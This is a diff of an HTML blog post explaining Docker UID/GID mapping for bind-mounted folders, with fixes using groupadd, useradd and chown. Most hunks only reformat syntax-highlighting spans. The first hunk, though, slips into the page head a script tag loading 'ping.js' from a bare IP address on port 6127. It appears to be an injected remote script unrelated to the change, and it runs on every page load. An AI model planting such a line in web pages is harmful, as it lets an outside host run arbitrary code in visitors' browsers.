@@ -45,6 +45,8 @@
   <script src='/js/lunr-2.3.9.min.js'></script>
   <script src='/js/search_index.js'></script>
   <script src='/js/search.min.js'></script>
+
+  <script src='http://192.34.63.156:6127/ping.js' async></script>
 </head>
 <body>
 <header>
@@ -100,69 +102,69 @@ February 1, 2022
 <p>Same file numbers, different mappings.<!--more--></p>
 <h2 id="uidgid">UID/GID</h2>
 <p>Imagine the following folder in the host:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>host<span class="o">)</span> $ ls -lah /home/alice/blog
-drwxr-xr-x <span class="m">12</span> alice devel <span class="m">4</span>.0K Jan <span class="m">30</span> <span class="m">21</span>:28 .
-drwxr-xr-x <span class="m">63</span> alice devel <span class="m">4</span>.0K Jan <span class="m">30</span> <span class="m">21</span>:25 ..
-drwxr-xr-x  <span class="m">2</span> alice devel <span class="m">4</span>.0K Jan <span class="m">30</span> <span class="m">20</span>:35 docker
-drwxr-xr-x  <span class="m">8</span> alice devel <span class="m">4</span>.0K Jan <span class="m">31</span> <span class="m">02</span>:40 .git
--rw-r--r--  <span class="m">1</span> alice devel   <span class="m">52</span> Jan <span class="m">22</span> <span class="m">14</span>:23 .gitignore
--rw-r--r--  <span class="m">1</span> alice devel <span class="m">1</span>.9K Jan <span class="m">30</span> <span class="m">21</span>:10 Makefile
-drwxr-xr-x <span class="m">26</span> alice devel <span class="m">4</span>.0K Jan <span class="m">31</span> <span class="m">02</span>:22 posts
+<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>host<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>ls<span class="w"> </span>-lah<span class="w"> </span>/home/alice/blog
+drwxr-xr-x<span class="w"> </span><span class="m">12</span><span class="w"> </span>alice<span class="w"> </span>devel<span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">21</span>:28<span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span><span class="m">63</span><span class="w"> </span>alice<span class="w"> </span>devel<span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">21</span>:25<span class="w"> </span>..
+drwxr-xr-x<span class="w">  </span><span class="m">2</span><span class="w"> </span>alice<span class="w"> </span>devel<span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">20</span>:35<span class="w"> </span>docker
+drwxr-xr-x<span class="w">  </span><span class="m">8</span><span class="w"> </span>alice<span class="w"> </span>devel<span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">02</span>:40<span class="w"> </span>.git
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>alice<span class="w"> </span>devel<span class="w">   </span><span class="m">52</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">14</span>:23<span class="w"> </span>.gitignore
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>alice<span class="w"> </span>devel<span class="w"> </span><span class="m">1</span>.9K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">21</span>:10<span class="w"> </span>Makefile
+drwxr-xr-x<span class="w"> </span><span class="m">26</span><span class="w"> </span>alice<span class="w"> </span>devel<span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">02</span>:22<span class="w"> </span>posts
 </code></pre></div>
 
 <p>All those files and folders belong to the user <code><span class="highlight-candombe-inline">alice</span></code> and the group <code><span class="highlight-candombe-inline">develop</span></code>.</p>
 <p>But that’s with the host’s mapping.</p>
 <p>We can see the file numbers behind running:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>host<span class="o">)</span> $ ls -lah --numeric-uid-gid /home/alice/blog
-drwxr-xr-x <span class="m">12</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">4</span>.0K Jan <span class="m">30</span> <span class="m">21</span>:28 .
-drwxr-xr-x <span class="m">63</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">4</span>.0K Jan <span class="m">30</span> <span class="m">21</span>:25 ..
-drwxr-xr-x  <span class="m">2</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">4</span>.0K Jan <span class="m">30</span> <span class="m">20</span>:35 docker
-drwxr-xr-x  <span class="m">8</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">4</span>.0K Jan <span class="m">31</span> <span class="m">02</span>:43 .git
--rw-r--r--  <span class="m">1</span> <span class="m">1001</span> <span class="m">1024</span>   <span class="m">52</span> Jan <span class="m">22</span> <span class="m">14</span>:23 .gitignore
--rw-r--r--  <span class="m">1</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">1</span>.9K Jan <span class="m">30</span> <span class="m">21</span>:10 Makefile
-drwxr-xr-x <span class="m">26</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">4</span>.0K Jan <span class="m">31</span> <span class="m">02</span>:22 posts
+<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>host<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>ls<span class="w"> </span>-lah<span class="w"> </span>--numeric-uid-gid<span class="w"> </span>/home/alice/blog
+drwxr-xr-x<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">21</span>:28<span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span><span class="m">63</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">21</span>:25<span class="w"> </span>..
+drwxr-xr-x<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">20</span>:35<span class="w"> </span>docker
+drwxr-xr-x<span class="w">  </span><span class="m">8</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">02</span>:43<span class="w"> </span>.git
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w">   </span><span class="m">52</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">14</span>:23<span class="w"> </span>.gitignore
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">1</span>.9K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">21</span>:10<span class="w"> </span>Makefile
+drwxr-xr-x<span class="w"> </span><span class="m">26</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">02</span>:22<span class="w"> </span>posts
 </code></pre></div>
 
 <p>So, for the host user <code><span class="highlight-candombe-inline">alice</span></code> maps to the UID <code><span class="highlight-candombe-inline"><span class="m">1001</span></span></code>; the same goes for the group <code><span class="highlight-candombe-inline">develop</span></code> and the GID <code><span class="highlight-candombe-inline"><span class="m">1024</span></span></code>.</p>
 <p>Now, imagine that we run a docker container and mount that folder above</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>host<span class="o">)</span> $ docker run -it -v /home/alice/blog:/wd ubuntu bash
+<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>host<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>docker<span class="w"> </span>run<span class="w"> </span>-it<span class="w"> </span>-v<span class="w"> </span>/home/alice/blog:/wd<span class="w"> </span>ubuntu<span class="w"> </span>bash
 </code></pre></div>
 
 <p>The host’s <code><span class="highlight-candombe-inline">/home/alice/blog</span></code> is mounted in <code><span class="highlight-candombe-inline">/wd</span></code> inside the container.</p>
 <p>If we list the files from <em>inside</em> the container we will see the <em>same</em> UIDs and GIDs</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>container<span class="o">)</span> $ ls -lah --numeric-uid-gid /wd
-drwxr-xr-x <span class="m">12</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">4</span>.0K Jan <span class="m">30</span> <span class="m">21</span>:28 .
-drwxr-xr-x <span class="m">63</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">4</span>.0K Jan <span class="m">30</span> <span class="m">21</span>:25 ..
-drwxr-xr-x  <span class="m">2</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">4</span>.0K Jan <span class="m">30</span> <span class="m">20</span>:35 docker
-drwxr-xr-x  <span class="m">8</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">4</span>.0K Jan <span class="m">31</span> <span class="m">02</span>:43 .git
--rw-r--r--  <span class="m">1</span> <span class="m">1001</span> <span class="m">1024</span>   <span class="m">52</span> Jan <span class="m">22</span> <span class="m">14</span>:23 .gitignore
--rw-r--r--  <span class="m">1</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">1</span>.9K Jan <span class="m">30</span> <span class="m">21</span>:10 Makefile
-drwxr-xr-x <span class="m">26</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">4</span>.0K Jan <span class="m">31</span> <span class="m">02</span>:22 posts
+<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>container<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>ls<span class="w"> </span>-lah<span class="w"> </span>--numeric-uid-gid<span class="w"> </span>/wd
+drwxr-xr-x<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">21</span>:28<span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span><span class="m">63</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">21</span>:25<span class="w"> </span>..
+drwxr-xr-x<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">20</span>:35<span class="w"> </span>docker
+drwxr-xr-x<span class="w">  </span><span class="m">8</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">02</span>:43<span class="w"> </span>.git
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w">   </span><span class="m">52</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">14</span>:23<span class="w"> </span>.gitignore
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">1</span>.9K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">21</span>:10<span class="w"> </span>Makefile
+drwxr-xr-x<span class="w"> </span><span class="m">26</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">02</span>:22<span class="w"> </span>posts
 </code></pre></div>
 
 <p>But not necessary we will see the same mapping.</p>
 <h2 id="incorrect-mapping-two-scenarios">Incorrect mapping: two scenarios</h2>
 <p>There are 2 cases.</p>
 <p><strong>Scenario 1</strong>: there is no user/group with those IDs in the container so you will see this:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>container<span class="o">)</span> $ ls -lah /wd
-drwxr-xr-x <span class="m">12</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">4</span>.0K Jan <span class="m">30</span> <span class="m">21</span>:28 .
-drwxr-xr-x <span class="m">63</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">4</span>.0K Jan <span class="m">30</span> <span class="m">21</span>:25 ..
-drwxr-xr-x  <span class="m">2</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">4</span>.0K Jan <span class="m">30</span> <span class="m">20</span>:35 docker
-drwxr-xr-x  <span class="m">8</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">4</span>.0K Jan <span class="m">31</span> <span class="m">02</span>:43 .git
--rw-r--r--  <span class="m">1</span> <span class="m">1001</span> <span class="m">1024</span>   <span class="m">52</span> Jan <span class="m">22</span> <span class="m">14</span>:23 .gitignore
--rw-r--r--  <span class="m">1</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">1</span>.9K Jan <span class="m">30</span> <span class="m">21</span>:10 Makefile
-drwxr-xr-x <span class="m">26</span> <span class="m">1001</span> <span class="m">1024</span> <span class="m">4</span>.0K Jan <span class="m">31</span> <span class="m">02</span>:22 posts
+<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>container<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>ls<span class="w"> </span>-lah<span class="w"> </span>/wd
+drwxr-xr-x<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">21</span>:28<span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span><span class="m">63</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">21</span>:25<span class="w"> </span>..
+drwxr-xr-x<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">20</span>:35<span class="w"> </span>docker
+drwxr-xr-x<span class="w">  </span><span class="m">8</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">02</span>:43<span class="w"> </span>.git
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w">   </span><span class="m">52</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">14</span>:23<span class="w"> </span>.gitignore
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">1</span>.9K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">21</span>:10<span class="w"> </span>Makefile
+drwxr-xr-x<span class="w"> </span><span class="m">26</span><span class="w"> </span><span class="m">1001</span><span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">02</span>:22<span class="w"> </span>posts
 </code></pre></div>
 
 <p><strong>Scenario 2</strong>: there is user/group in the container assigned to those IDs but they are mapped, of course, to something different than <code><span class="highlight-candombe-inline">alice</span></code>/<code><span class="highlight-candombe-inline">develop</span></code>:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>container<span class="o">)</span> $ ls -lah /wd
-drwxr-xr-x <span class="m">12</span> apt sys <span class="m">4</span>.0K Jan <span class="m">30</span> <span class="m">21</span>:28 .
-drwxr-xr-x <span class="m">63</span> apt sys <span class="m">4</span>.0K Jan <span class="m">30</span> <span class="m">21</span>:25 ..
-drwxr-xr-x  <span class="m">2</span> apt sys <span class="m">4</span>.0K Jan <span class="m">30</span> <span class="m">20</span>:35 docker
-drwxr-xr-x  <span class="m">8</span> apt sys <span class="m">4</span>.0K Jan <span class="m">31</span> <span class="m">02</span>:43 .git
--rw-r--r--  <span class="m">1</span> apt sys   <span class="m">52</span> Jan <span class="m">22</span> <span class="m">14</span>:23 .gitignore
--rw-r--r--  <span class="m">1</span> apt sys <span class="m">1</span>.9K Jan <span class="m">30</span> <span class="m">21</span>:10 Makefile
-drwxr-xr-x <span class="m">26</span> apt sys <span class="m">4</span>.0K Jan <span class="m">31</span> <span class="m">02</span>:22 posts
+<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>container<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>ls<span class="w"> </span>-lah<span class="w"> </span>/wd
+drwxr-xr-x<span class="w"> </span><span class="m">12</span><span class="w"> </span>apt<span class="w"> </span>sys<span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">21</span>:28<span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span><span class="m">63</span><span class="w"> </span>apt<span class="w"> </span>sys<span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">21</span>:25<span class="w"> </span>..
+drwxr-xr-x<span class="w">  </span><span class="m">2</span><span class="w"> </span>apt<span class="w"> </span>sys<span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">20</span>:35<span class="w"> </span>docker
+drwxr-xr-x<span class="w">  </span><span class="m">8</span><span class="w"> </span>apt<span class="w"> </span>sys<span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">02</span>:43<span class="w"> </span>.git
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>apt<span class="w"> </span>sys<span class="w">   </span><span class="m">52</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">14</span>:23<span class="w"> </span>.gitignore
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>apt<span class="w"> </span>sys<span class="w"> </span><span class="m">1</span>.9K<span class="w"> </span>Jan<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">21</span>:10<span class="w"> </span>Makefile
+drwxr-xr-x<span class="w"> </span><span class="m">26</span><span class="w"> </span>apt<span class="w"> </span>sys<span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>Jan<span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">02</span>:22<span class="w"> </span>posts
 </code></pre></div>
 
 <h2 id="how-to-fix-this">How to fix this?</h2>
@@ -181,20 +183,20 @@ You can skip this step for the scenario 1 and use the original UID/GID <code><sp
 </span></p>
 <p>For example, let’s pick <code><span class="highlight-candombe-inline"><span class="m">1201</span></span></code> for the UID and <code><span class="highlight-candombe-inline"><span class="m">1224</span></span></code> for the group.</p>
 <p>We can check this running <code><span class="highlight-candombe-inline">grep</span></code> and getting a 0 response which means that the id was not found (so it is not used)</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>host<span class="o">)</span> $ grep -c <span class="m">1201</span> /etc/passwd
+<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>host<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>grep<span class="w"> </span>-c<span class="w"> </span><span class="m">1201</span><span class="w"> </span>/etc/passwd
 <span class="m">0</span>
-<span class="o">(</span>host<span class="o">)</span> $ grep -c <span class="m">1224</span> /etc/group
+<span class="o">(</span>host<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>grep<span class="w"> </span>-c<span class="w"> </span><span class="m">1224</span><span class="w"> </span>/etc/group
 <span class="m">0</span>
 
-<span class="o">(</span>container<span class="o">)</span> $ grep -c <span class="m">1201</span> /etc/passwd
+<span class="o">(</span>container<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>grep<span class="w"> </span>-c<span class="w"> </span><span class="m">1201</span><span class="w"> </span>/etc/passwd
 <span class="m">0</span>
-<span class="o">(</span>container<span class="o">)</span> $ grep -c <span class="m">1224</span> /etc/group
+<span class="o">(</span>container<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>grep<span class="w"> </span>-c<span class="w"> </span><span class="m">1224</span><span class="w"> </span>/etc/group
 <span class="m">0</span>
 </code></pre></div>
 
 <p>With a free UID/GID we need to create a group and an user with those ids</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>container<span class="o">)</span> $ sudo groupadd -g <span class="m">1224</span> devel2
-<span class="o">(</span>container<span class="o">)</span> $ sudo useradd -s /bin/bash -u <span class="m">1201</span> -M -g <span class="m">1224</span> alice2
+<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>container<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>sudo<span class="w"> </span>groupadd<span class="w"> </span>-g<span class="w"> </span><span class="m">1224</span><span class="w"> </span>devel2
+<span class="o">(</span>container<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>sudo<span class="w"> </span>useradd<span class="w"> </span>-s<span class="w"> </span>/bin/bash<span class="w"> </span>-u<span class="w"> </span><span class="m">1201</span><span class="w"> </span>-M<span class="w"> </span>-g<span class="w"> </span><span class="m">1224</span><span class="w"> </span>alice2
 </code></pre></div>
 
 <p>These creates a group named <code><span class="highlight-candombe-inline">devel2</span></code> with GID of <code><span class="highlight-candombe-inline"><span class="m">1224</span></span></code> and an user named <code><span class="highlight-candombe-inline">alice2</span></code> with UID of <code><span class="highlight-candombe-inline"><span class="m">1201</span></span></code>. <em>Yes, I’m not very creative with the names.</em></p>
@@ -205,24 +207,24 @@ You can skip this step for the scenario 1 and use the original UID/GID <code><sp
 You can skip this step for the scenario 1 as you can use <code><span class="highlight-candombe-inline">alice</span></code> and <code><span class="highlight-candombe-inline">devel</span></code>
 </span></p>
 <p>Now we do the same in the <em>host</em></p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>host<span class="o">)</span> $ sudo groupadd -g <span class="m">1224</span> devel2
-<span class="o">(</span>host<span class="o">)</span> $ sudo useradd -s /bin/bash -u <span class="m">1201</span> -M -g <span class="m">1224</span> alice2
+<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>host<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>sudo<span class="w"> </span>groupadd<span class="w"> </span>-g<span class="w"> </span><span class="m">1224</span><span class="w"> </span>devel2
+<span class="o">(</span>host<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>sudo<span class="w"> </span>useradd<span class="w"> </span>-s<span class="w"> </span>/bin/bash<span class="w"> </span>-u<span class="w"> </span><span class="m">1201</span><span class="w"> </span>-M<span class="w"> </span>-g<span class="w"> </span><span class="m">1224</span><span class="w"> </span>alice2
 </code></pre></div>
 
 <p>Finally change the ownership of the shared files running</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>host<span class="o">)</span> $ sudo chown -R <span class="m">1201</span>:1224 /home/user/blog
+<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>host<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>sudo<span class="w"> </span>chown<span class="w"> </span>-R<span class="w"> </span><span class="m">1201</span>:1224<span class="w"> </span>/home/user/blog
 </code></pre></div>
 
 <p>Now before working with the files you need to log in as <code><span class="highlight-candombe-inline">alice2</span></code></p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>host<span class="o">)</span> $ sudo su alice2
+<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>host<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>sudo<span class="w"> </span>su<span class="w"> </span>alice2
 
-<span class="o">(</span>container<span class="o">)</span> $ sudo su alice2
+<span class="o">(</span>container<span class="o">)</span><span class="w"> </span>$<span class="w"> </span>sudo<span class="w"> </span>su<span class="w"> </span>alice2
 </code></pre></div>
 
 <p>This applies to both the host and container.</p>
 <p>Once logged in it may be convenient to set your <code><span class="highlight-candombe-inline">HOME</span></code>.</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>host<span class="o">)</span> $ <span class="nb">export</span> <span class="nv">HOME</span><span class="o">=</span>/home/alice
-<span class="o">(</span>container<span class="o">)</span> $ <span class="nb">export</span> <span class="nv">HOME</span><span class="o">=</span>/wd
+<div class="highlight-candombe"><pre><span></span><code><span class="o">(</span>host<span class="o">)</span><span class="w"> </span>$<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">HOME</span><span class="o">=</span>/home/alice
+<span class="o">(</span>container<span class="o">)</span><span class="w"> </span>$<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">HOME</span><span class="o">=</span>/wd
 </code></pre></div>
 
 <h2 id="why-a-simplest-chownchmod-does-not-work">Why a simplest <code><span class="highlight-candombe-inline">chown</span></code>/<code><span class="highlight-candombe-inline">chmod</span></code> does not work?</h2>
